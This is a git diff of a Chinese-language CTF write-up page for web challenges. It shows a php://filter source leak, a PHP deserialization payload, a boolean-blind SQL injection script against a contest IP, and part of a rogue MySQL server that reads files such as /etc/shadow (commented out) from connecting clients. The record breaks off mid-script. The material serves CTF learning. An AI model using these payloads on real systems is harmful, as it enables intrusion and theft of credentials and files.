@@ -507,13 +507,14 @@
 <h2 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp" class="plugin-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP:</h2>
 <ul>
 <li><a href="https://www.zhaoj.in/read-5417.html" target="_blank">https://www.zhaoj.in/read-5417.html</a></li>
+<li><a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank">https://www.52pojie.cn/thread-936377-1-1.html</a></li>
 </ul>
 <h2 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;" class="plugin-anchor" href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h2>
 <ul>
 <li>&#x6682;&#x65E0;</li>
 </ul>
 <h2 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><a name="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;" class="plugin-anchor" href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h2>
-<p><strong>&#x611F;&#x8C22;&#x4F5C;&#x8005;&#xFF1A;Glzjin</strong></p>
+<p><strong>&#x611F;&#x8C22;&#x4F5C;&#x8005;&#xFF1A;Glzjin&#x3001;wu1a&#x3001;warden&#x3001;lizhirui</strong></p>
 <h2 id="web"><a name="web" class="plugin-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>Web</h2>
 <p><strong>&#x4F5C;&#x8005;&#xFF1A;Glzjin</strong></p>
 <h3 id="1&#x3001;justsoso"><a name="1&#x3001;justsoso" class="plugin-anchor" href="#1&#x3001;justsoso"><i class="fa fa-link" aria-hidden="true"></i></a>1&#x3001;JustSoso</h3>
@@ -526,128 +527,128 @@
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15557714443b02362bcd5bf220079e6bcee5867207-1024x164.png" alt=""></p>
 <p>2&#x3001;&#x6765;&#x770B;&#x770B;&#x6E90;&#x7801;&#x3002;&#x7ED9;&#x4E86;&#x53C2;&#x6570;&#x548C;&#x63D0;&#x793A;&#xFF0C;&#x8BA9;&#x83B7;&#x53D6; hint.php &#x7684;&#x6E90;&#x7801;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15557714635bd0ceb0416ec9f0b90e749bda0a6c5c-1024x163.png" alt=""></p>
-<p>3&#x3001;&#x90A3;&#x4E48;&#x5C31;&#x6765;&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x770B;&#x770B;&#x5427;&#xFF0C;&#x8BBF;&#x95EE; /?file=php://filter/read=convert.base64-encode/resource=hint.php</p>
+<p>3&#x3001;&#x90A3;&#x4E48;&#x5C31;&#x6765;&#x83B7;&#x53D6;&#x6E90;&#x7801;&#x770B;&#x770B;&#x5427;&#xFF0C;&#x8BBF;&#x95EE; <code>/?file=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155577166239442308dcf360add6d0101db67a7a51-1024x76.png" alt=""></p>
 <p>4&#x3001;BASE64 &#x89E3;&#x7801;&#x4E00;&#x4E0B;&#xFF0C;&#x5F97;&#x5230; hint.php &#x7684;&#x6E90;&#x7801;&#x3002;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
-class Handle{
-    private $handle;
-    public function __wakeup(){
-        foreach(get_object_vars($this) as $k =&gt; $v) {
-            $this-&gt;$k = null;
+<pre class="language-"><code>    <span class="token prolog">&lt;?php
+    class Handle{
+        private $handle;
+        public function __wakeup(){
+            foreach(get_object_vars($this) as $k =&gt; $v) {
+                $this-&gt;$k = null;
+            }
+            echo &quot;Waking up\n&quot;;
         }
-        echo &quot;Waking up\n&quot;;
-    }
-    public function __construct($handle) {
-        $this-&gt;handle = $handle;
-    }
-    public function __destruct(){
-        $this-&gt;handle-&gt;getFlag();
-    }
-}
-
-class Flag{
-    public $file;
-    public $token;
-    public $token_flag;
-
-    function __construct($file){
-        $this-&gt;file = $file;
-        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
+        public function __construct($handle) {
+            $this-&gt;handle = $handle;
+        }
+        public function __destruct(){
+            $this-&gt;handle-&gt;getFlag();
+        }
     }
 
-    public function getFlag(){
-        $this-&gt;token_flag = md5(rand(1,10000));
-        if($this-&gt;token === $this-&gt;token_flag)
-        {
-            if(isset($this-&gt;file)){
-                echo @highlight_file($this-&gt;file,true);
+    class Flag{
+        public $file;
+        public $token;
+        public $token_flag;
+
+        function __construct($file){
+            $this-&gt;file = $file;
+            $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
+        }
+
+        public function getFlag(){
+            $this-&gt;token_flag = md5(rand(1,10000));
+            if($this-&gt;token === $this-&gt;token_flag)
+            {
+                if(isset($this-&gt;file)){
+                    echo @highlight_file($this-&gt;file,true);
+                }
             }
         }
     }
-}
-?&gt;</span>
+    ?&gt;</span>
 </code></pre><p>5&#x3001;&#x91CD;&#x590D;&#x4E0A;&#x9762;&#x7684; 3~4 &#x6B65;&#xFF0C;&#x83B7;&#x53D6; index.php &#x7684;&#x6E90;&#x7801;&#x3002;</p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
-<span class="token prolog">&lt;?php
-error_reporting(0);
-$file = $_GET[&quot;file&quot;];
-$payload = $_GET[&quot;payload&quot;];
-if(!isset($file)){
-    echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;
-}
-if(preg_match(&quot;/flag/&quot;,$file)){
-    die(&apos;hack attacked!!!&apos;);
-}
-@include($file);
-if(isset($payload)){
-    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
-    parse_str($url[&apos;query&apos;],$query);
-    foreach($query as $value){
-        if (preg_match(&quot;/flag/&quot;,$value)) {
-            die(&apos;stop hacking!&apos;);
-            exit();
-        }
+<pre class="language-"><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+    <span class="token prolog">&lt;?php
+    error_reporting(0);
+    $file = $_GET[&quot;file&quot;];
+    $payload = $_GET[&quot;payload&quot;];
+    if(!isset($file)){
+        echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;
     }
-    $payload = unserialize($payload);
-}else{
-   echo &quot;Missing parameters&quot;;
-}
-?&gt;</span>
-<span class="token comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span>
-<span class="token comment">&lt;!--Please get the source of hint.php--&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+    if(preg_match(&quot;/flag/&quot;,$file)){
+        die(&apos;hack attacked!!!&apos;);
+    }
+    @include($file);
+    if(isset($payload)){
+        $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
+        parse_str($url[&apos;query&apos;],$query);
+        foreach($query as $value){
+            if (preg_match(&quot;/flag/&quot;,$value)) {
+                die(&apos;stop hacking!&apos;);
+                exit();
+            }
+        }
+        $payload = unserialize($payload);
+    }else{
+       echo &quot;Missing parameters&quot;;
+    }
+    ?&gt;</span>
+    <span class="token comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span>
+    <span class="token comment">&lt;!--Please get the source of hint.php--&gt;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
 </code></pre><p>6&#x3001;&#x6765;&#x5BA1;&#x8BA1;&#x4E00;&#x4E0B;&#x6E90;&#x7801;&#x3002;</p>
 <p>index.php &#x6709; file &#x548C; payload &#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5148; include &#x4E86; file &#x6240;&#x6307;&#x5411;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x518D;&#x7ECF;&#x8FC7;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x68C0;&#x6D4B;&#x4E4B;&#x540E; &#x53CD;&#x5E8F;&#x5217;&#x5316; payload&#x3002;</p>
 <p>&#x7136;&#x540E; hint.php &#x6709;&#x4E24;&#x4E2A;&#x7C7B; Handle &#x548C; Flag&#x3002; &#x5BF9;&#x4E8E; Handle &#x7C7B;&#xFF0C;&#x5B83;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5; Weakup &#x4F1A;&#x6E05;&#x7A7A;&#x5176;&#x81EA;&#x8EAB;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF0C;&#x5C06;&#x5176;&#x90FD;&#x7F6E;&#x4E3A; null&#x3002;&#x800C;&#x5176;&#x6790;&#x6784;&#x51FD;&#x6570;&#x5219;&#x4F1A;&#x8C03;&#x7528;&#x81EA;&#x8EAB;&#x6210;&#x5458;&#x53D8;&#x91CF; handle &#x7684; getFlag &#x65B9;&#x6CD5;&#x3002;&#x800C; Flag &#x7C7B;&#x5C31;&#x6709;&#x8FD9;&#x4E2A; getFlag &#x65B9;&#x6CD5;&#x4E86;&#xFF0C;&#x5176;&#x4E2D;&#x4F1A;&#x968F;&#x673A;&#x4E00;&#x4E2A; md5(1~10000&#x968F;&#x673A;&#x6570;) &#x7684; flag_token&#xFF0C;&#x548C;&#x81EA;&#x8EAB;&#x7684; token &#x505A;&#x6BD4;&#x8F83;&#xFF0C;&#x76F8;&#x7B49;&#x5C31;&#x53BB;&#x8BFB;&#x6587;&#x4EF6;&#x3002;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528;&#x8FD9;&#x91CC;&#x6765;&#x8BFB; flag.php &#x6587;&#x4EF6;&#x4E86;&#x3002;</p>
 <p>7&#x3001;&#x628A;&#x6E90;&#x7801;&#x62F7;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x6765;&#x4F2A;&#x9020;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x3002;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
-class Handle{
-    private $handle;
-    public function __wakeup(){
-        foreach(get_object_vars($this) as $k =&gt; $v) {
-            $this-&gt;$k = null;
+<pre class="language-"><code>    <span class="token prolog">&lt;?php
+    class Handle{
+        private $handle;
+        public function __wakeup(){
+            foreach(get_object_vars($this) as $k =&gt; $v) {
+                $this-&gt;$k = null;
+            }
+            echo &quot;Waking up\n&quot;;
         }
-        echo &quot;Waking up\n&quot;;
-    }
-    public function __construct($handle) {
-        $this-&gt;handle = $handle;
-    }
-    public function __destruct(){
-        $this-&gt;handle-&gt;getFlag();
-    }
-}
-
-class Flag{
-    public $file;
-    public $token;
-    public $token_flag;
-
-    function __construct($file){
-        $this-&gt;file = $file;
-        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
-        $this-&gt;token = &amp;$this-&gt;token_flag;
+        public function __construct($handle) {
+            $this-&gt;handle = $handle;
+        }
+        public function __destruct(){
+            $this-&gt;handle-&gt;getFlag();
+        }
     }
 
-    public function getFlag(){
-        $this-&gt;token_flag = md5(rand(1,10000));
-        if($this-&gt;token === $this-&gt;token_flag)
-        {
-            if(isset($this-&gt;file)){
-                echo @highlight_file($this-&gt;file,true);
+    class Flag{
+        public $file;
+        public $token;
+        public $token_flag;
+
+        function __construct($file){
+            $this-&gt;file = $file;
+            $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
+            $this-&gt;token = &amp;$this-&gt;token_flag;
+        }
+
+        public function getFlag(){
+            $this-&gt;token_flag = md5(rand(1,10000));
+            if($this-&gt;token === $this-&gt;token_flag)
+            {
+                if(isset($this-&gt;file)){
+                    echo @highlight_file($this-&gt;file,true);
+                }
             }
         }
     }
-}
 
 
-$flag = new Flag(&quot;flag.php&quot;);
-$handle = new Handle($flag);
-echo serialize($handle).&quot;\n&quot;;
-?&gt;</span>
+    $flag = new Flag(&quot;flag.php&quot;);
+    $handle = new Handle($flag);
+    echo serialize($handle).&quot;\n&quot;;
+    ?&gt;</span>
 </code></pre><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x52A0;&#x4E86;&#x4E00;&#x884C;&#xFF1A;</p>
-<pre class="language-"><code>$this-&gt;token = &amp;$this-&gt;token_flag;
-</code></pre><p>&#x8FD9;&#x6837;&#x505A;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x4E0B;&#x9762; getFlag &#x90A3;&#x7684;&#x6BD4;&#x8F83;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#x7684;&#x5F15;&#x7528;&#x53D8;&#x91CF;&#x548C;&#x4ED6;&#x6240;&#x6307;&#x5411;&#x7684;&#x53D8;&#x91CF;&#x4E00;&#x6BD4;&#x8F83;&#xFF0C;&#x5F53;&#x7136;&#x76F8;&#x7B49;&#x4E86;&#x3002;</p>
+<p><code>$this-&gt;token = &amp;$this-&gt;token_flag;</code></p>
+<p>&#x8FD9;&#x6837;&#x505A;&#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x4E0B;&#x9762; getFlag &#x90A3;&#x7684;&#x6BD4;&#x8F83;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#x7684;&#x5F15;&#x7528;&#x53D8;&#x91CF;&#x548C;&#x4ED6;&#x6240;&#x6307;&#x5411;&#x7684;&#x53D8;&#x91CF;&#x4E00;&#x6BD4;&#x8F83;&#xFF0C;&#x5F53;&#x7136;&#x76F8;&#x7B49;&#x4E86;&#x3002;</p>
 <p>&#x540E;&#x9762;&#x4E09;&#x884C;&#x5C31;&#x662F;&#x8981;&#x6C42;&#x53BB;&#x8BFB; flag.php &#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x4E86;&#x3002;</p>
 <p>8&#x3001;&#x8FD0;&#x884C;&#x4E00;&#x4E0B;&#xFF0C;&#x751F;&#x6210;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555773182add9a0c46679f8c4457aed8c56261396-1024x115.png" alt=""></p>
@@ -684,348 +685,348 @@ echo serialize($handle).&quot;\n&quot;;
 <p>&#x4E0A;&#x9762;&#x6240;&#x8BF4;&#x6709;&#x8BED;&#x53E5;&#x6B63;&#x786E;&#x6267;&#x884C;&#x4E0E;&#x5426;&#x65F6;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x533A;&#x5206;&#x4E86;&#x3002;</p>
 <p>7&#x3001;&#x4ECE;&#x8FD9;&#x513F; <a href="http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" target="_blank">http://zzqsmile.top/2018/06/04/python3/2018-06-04-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</a> &#x627E;&#x4E86;&#x4E2A;&#x5C0F;&#x811A;&#x672C;&#xFF0C;&#x628A;&#x6211;&#x4EEC;&#x7684; payload &#x653E;&#x8FDB;&#x53BB;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x8FD4;&#x56DE;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x3002;</p>
 <p>&#x540C;&#x65F6;&#x6CE8;&#x610F; or &#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x6240;&#x4EE5; information_schema &#x4E5F;&#x4F20;&#x4E0D;&#x4E0A;&#x53BB;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x5F97;&#x81EA;&#x5DF1;&#x731C;&#x731C;&#x8868;&#x540D;&#x4E86;&#x3002;</p>
-<pre class="language-"><code>#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+<pre class="language-"><code>    #!/usr/bin/env python3
+    # -*- coding: utf-8 -*-
 
-import requests
-
-
-def main():
-    get_all_databases(&quot;http://39.97.167.120:52105/&quot;)
+    import requests
 
 
-def http_get(url, payload):
-    result = requests.post(url, data={&apos;username&apos;: &apos;admin&apos; + payload, &apos;password&apos;: &apos;123456&apos;})
-    result.encoding = &apos;utf-8&apos;
-    if result.text.find(&apos;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x5931;&#x8D25;&apos;) == -1:
-        return True
-    else:
-        return False
+    def main():
+        get_all_databases(&quot;http://39.97.167.120:52105/&quot;)
 
 
-# &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
-def get_all_databases(url):
-    db_nums_payload = &quot;select count(*) from users&quot;
-    db_numbers = half(url, db_nums_payload)
-    print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
-
-
-# &#x4E8C;&#x5206;&#x6CD5;&#x51FD;&#x6570;
-def half(url, payload):
-    low = 0
-    high = 126
-    # print(standard_html)
-    while low &lt;= high:
-        mid = (low + high) / 2
-        mid_num_payload = &quot;&apos; union select cot(1 and (%s) &gt; %d);#&quot; % (payload, mid)
-        # print(mid_num_payload)
-        # print(mid_html)
-        if http_get(url, mid_num_payload):
-            low = mid + 1
+    def http_get(url, payload):
+        result = requests.post(url, data={&apos;username&apos;: &apos;admin&apos; + payload, &apos;password&apos;: &apos;123456&apos;})
+        result.encoding = &apos;utf-8&apos;
+        if result.text.find(&apos;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x5931;&#x8D25;&apos;) == -1:
+            return True
         else:
-            high = mid - 1
-    mid_num = int((low + high + 1) / 2)
-    return mid_num
+            return False
 
 
-if __name__ == &apos;__main__&apos;:
-    main()
+    # &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
+    def get_all_databases(url):
+        db_nums_payload = &quot;select count(*) from users&quot;
+        db_numbers = half(url, db_nums_payload)
+        print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
+
+
+    # &#x4E8C;&#x5206;&#x6CD5;&#x51FD;&#x6570;
+    def half(url, payload):
+        low = 0
+        high = 126
+        # print(standard_html)
+        while low &lt;= high:
+            mid = (low + high) / 2
+            mid_num_payload = &quot;&apos; union select cot(1 and (%s) &gt; %d);#&quot; % (payload, mid)
+            # print(mid_num_payload)
+            # print(mid_html)
+            if http_get(url, mid_num_payload):
+                low = mid + 1
+            else:
+                high = mid - 1
+        mid_num = int((low + high + 1) / 2)
+        return mid_num
+
+
+    if __name__ == &apos;__main__&apos;:
+        main()
 </code></pre><p>8&#x3001;&#x4E0D;&#x65AD; fuzz&#xFF0C;&#x5F53; &#x957F;&#x5EA6;&#x4E0D;&#x4E3A; 0 &#x65F6;&#x5C31;&#x662F;&#x627E;&#x5230;&#x8868;&#x4E86;&#x3002;</p>
 <p><a href="https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab.png" target="_blank"><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155577545209ac8a24e2057945a3fd23926819caab-1024x486.png" alt=""></a></p>
 <p>0&#xFF0C;&#x6CA1;&#x627E;&#x5230;&#x6216;&#x6CA1;&#x6570;&#x636E;</p>
 <p><a href="https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b.png" target="_blank"><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555775487f4d3e0156c75efb90d18855acddc795b-1024x626.png" alt=""></a></p>
 <p>1&#xFF0C;&#x627E;&#x5230;&#x4E86;</p>
 <p>9&#x3001;&#x627E;&#x5230;&#x8868;&#x540D;&#x4E3A; user&#xFF0C;&#x77E5;&#x9053;&#x8868;&#x540D;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x5217;&#x540D;&#xFF0C;&#x90A3;&#x5C31;&#x6539;&#x4E0B;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x6837;&#x6574;&#xFF0C;&#x7ED9;&#x8868;&#x8BBE;&#x522B;&#x540D;&#x3002;</p>
-<pre class="language-"><code># &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
-def get_all_databases(url):
-    db_nums_payload = &quot;select length(group_concat(a.1)) from (select 1, 2 union select * from user)a&quot;
-    db_numbers = half(url, db_nums_payload)
-    print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
+<pre class="language-"><code>    # &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
+    def get_all_databases(url):
+        db_nums_payload = &quot;select length(group_concat(a.1)) from (select 1, 2 union select * from user)a&quot;
+        db_numbers = half(url, db_nums_payload)
+        print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
 
-    db_payload = &quot;select group_concat(a.1) from (select 1, 2 union select * from user)a&quot;
-    db_name = &quot;&quot;
-    for y in range(1, db_numbers + 1):
-        db_name_payload = &quot;ascii(substr((&quot; + db_payload + &quot;),%d,1))&quot; % (
-            y)
-        db_name += chr(half(url, db_name_payload))
+        db_payload = &quot;select group_concat(a.1) from (select 1, 2 union select * from user)a&quot;
+        db_name = &quot;&quot;
+        for y in range(1, db_numbers + 1):
+            db_name_payload = &quot;ascii(substr((&quot; + db_payload + &quot;),%d,1))&quot; % (
+                y)
+            db_name += chr(half(url, db_name_payload))
 
-    print(&quot;&#x503C;&#xFF1A;&quot; + db_name)
+        print(&quot;&#x503C;&#xFF1A;&quot; + db_name)
 </code></pre><p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15557758642ae55ba830733a953be12d6503b92dd1-1024x392.png" alt=""></p>
 <p>&#x7B2C;&#x4E00;&#x5217;&#x662F;&#x7528;&#x6237;&#x540D;&#x3002;</p>
 <p>&#x53C2;&#x770B;&#x8D44;&#x6599;&#xFF1A;<a href="http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D" target="_blank">http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#1-10-1-%E5%88%AB%E5%90%8D</a></p>
 <p>10&#x3001;&#x518D;&#x6765;&#x7B2C;&#x4E8C;&#x5217;&#x8BD5;&#x8BD5;&#x3002;</p>
-<pre class="language-"><code># &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
-def get_all_databases(url):
-    db_nums_payload = &quot;select length(group_concat(a.2)) from (select 1, 2 union select * from user)a&quot;
-    db_numbers = half(url, db_nums_payload)
-    print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
+<pre class="language-"><code>    # &#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;
+    def get_all_databases(url):
+        db_nums_payload = &quot;select length(group_concat(a.2)) from (select 1, 2 union select * from user)a&quot;
+        db_numbers = half(url, db_nums_payload)
+        print(&quot;&#x957F;&#x5EA6;&#x4E3A;&#xFF1A;%d&quot; % db_numbers)
 
-    db_payload = &quot;select group_concat(a.2) from (select 1, 2 union select * from user)a&quot;
-    db_name = &quot;&quot;
-    for y in range(1, db_numbers + 1):
-        db_name_payload = &quot;ascii(substr((&quot; + db_payload + &quot;),%d,1))&quot; % (
-            y)
-        db_name += chr(half(url, db_name_payload))
+        db_payload = &quot;select group_concat(a.2) from (select 1, 2 union select * from user)a&quot;
+        db_name = &quot;&quot;
+        for y in range(1, db_numbers + 1):
+            db_name_payload = &quot;ascii(substr((&quot; + db_payload + &quot;),%d,1))&quot; % (
+                y)
+            db_name += chr(half(url, db_name_payload))
 
-    print(&quot;&#x503C;&#xFF1A;&quot; + db_name)
+        print(&quot;&#x503C;&#xFF1A;&quot; + db_name)
 </code></pre><p>&#x7B2C;&#x4E8C;&#x5217;&#x5C31;&#x662F;&#x5BC6;&#x7801;&#x4E86;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555775939b3fb89ba7ca458662560e7d74d261124-1024x413.png" alt=""></p>
 <p>&#x4F3C;&#x4E4E;&#x8FD8;&#x63D0;&#x793A;&#x6211;&#x4EEC; flag &#x5728; /fll1llag_h3r3&#x3002;</p>
 <p>11&#x3001;&#x5148;&#x7528;&#x8FD9;&#x7EC4;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x770B;&#x770B;&#xFF0C;&#x770B;&#x5230;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x6210;&#x529F;&#x3002;</p>
 <p><a href="https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d.png" target="_blank"><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555776020ee459fa67678ae8c83bfe8a7b9f93c6d-1024x346.png" alt=""></a></p>
 <p>12&#x3001;&#x5F88;&#x719F;&#x6089;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x796D;&#x51FA;&#x6211;&#x4EEC;&#x7684;&#x7956;&#x4F20;&#x6076;&#x610F; MySQL &#x670D;&#x52A1;&#x5668;&#x5427;&#x3002;&#x6539;&#x597D;&#x8981;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD0;&#x884C;&#x3002;</p>
-<pre class="language-"><code>#!/usr/bin/env python
-#coding: utf8
+<pre class="language-"><code>    #!/usr/bin/env python
+    #coding: utf8
 
 
-import socket
-import asyncore
-import asynchat
-import struct
-import random
-import logging
-import logging.handlers
+    import socket
+    import asyncore
+    import asynchat
+    import struct
+    import random
+    import logging
+    import logging.handlers
 
 
 
-PORT = 3306
+    PORT = 3306
 
-log = logging.getLogger(__name__)
+    log = logging.getLogger(__name__)
 
-log.setLevel(logging.DEBUG)
-# tmp_format = logging.handlers.WatchedFileHandler(&apos;mysql.log&apos;, &apos;ab&apos;)
-tmp_format = logging.StreamHandler()
-tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))
-log.addHandler(
-    tmp_format
-)
+    log.setLevel(logging.DEBUG)
+    # tmp_format = logging.handlers.WatchedFileHandler(&apos;mysql.log&apos;, &apos;ab&apos;)
+    tmp_format = logging.StreamHandler()
+    tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))
+    log.addHandler(
+        tmp_format
+    )
 
-filelist = (
-#    r&apos;c:\boot.ini&apos;,
-#    r&apos;c:\windows\win.ini&apos;,
-#    r&apos;c:\windows\system32\drivers\etc\hosts&apos;,
-    &apos;/fll1llag_h3r3&apos;,
-#    &apos;/etc/shadow&apos;,
-)
-
-
-#================================================
-#=======No need to change after this lines=======
-#================================================
-
-__author__ = &apos;Gifts&apos;
-
-def daemonize():
-    import os, warnings
-    if os.name != &apos;posix&apos;:
-        warnings.warn(&apos;Cant create daemon on non-posix system&apos;)
-        return
-
-    if os.fork(): os._exit(0)
-    os.setsid()
-    if os.fork(): os._exit(0)
-    os.umask(0o022)
-    null=os.open(&apos;/dev/null&apos;, os.O_RDWR)
-    for i in xrange(3):
-        try:
-            os.dup2(null, i)
-        except OSError as e:
-            if e.errno != 9: raise
-    os.close(null)
+    filelist = (
+    #    r&apos;c:\boot.ini&apos;,
+    #    r&apos;c:\windows\win.ini&apos;,
+    #    r&apos;c:\windows\system32\drivers\etc\hosts&apos;,
+        &apos;/fll1llag_h3r3&apos;,
+    #    &apos;/etc/shadow&apos;,
+    )
 
 
-class LastPacket(Exception):
-    pass
+    #================================================
+    #=======No need to change after this lines=======
+    #================================================
 
+    __author__ = &apos;Gifts&apos;
 
-class OutOfOrder(Exception):
-    pass
+    def daemonize():
+        import os, warnings
+        if os.name != &apos;posix&apos;:
+            warnings.warn(&apos;Cant create daemon on non-posix system&apos;)
+            return
 
-
-class mysql_packet(object):
-    packet_header = struct.Struct(&apos;&lt;Hbb&apos;)
-    packet_header_long = struct.Struct(&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Hbbb&apos;)</span>
-    <span class="token attr-name">def</span> <span class="token attr-name">__init__(self,</span> <span class="token attr-name">packet_type,</span> <span class="token attr-name"><span class="token namespace">payload):</span></span>
-        <span class="token attr-name">if</span> <span class="token attr-name">isinstance(packet_type,</span> <span class="token attr-name"><span class="token namespace">mysql_packet):</span></span>
-            <span class="token attr-name">self.packet_num</span> <span class="token attr-value"><span class="token punctuation">=</span> packet_type.packet_num</span> <span class="token attr-name">+</span> <span class="token attr-name">1</span>
-        <span class="token attr-name"><span class="token namespace">else:</span></span>
-            <span class="token attr-name">self.packet_num</span> <span class="token attr-value"><span class="token punctuation">=</span> packet_type</span>
-        <span class="token attr-name">self.payload</span> <span class="token attr-value"><span class="token punctuation">=</span> payload</span>
-
-    <span class="token attr-name">def</span> <span class="token attr-name"><span class="token namespace">__str__(self):</span></span>
-        <span class="token attr-name">payload_len</span> <span class="token attr-value"><span class="token punctuation">=</span> len(self.payload)</span>
-        <span class="token attr-name">if</span> <span class="token attr-name">payload_len</span> <span class="token attr-name">&lt;</span> <span class="token attr-name"><span class="token namespace">65536:</span></span>
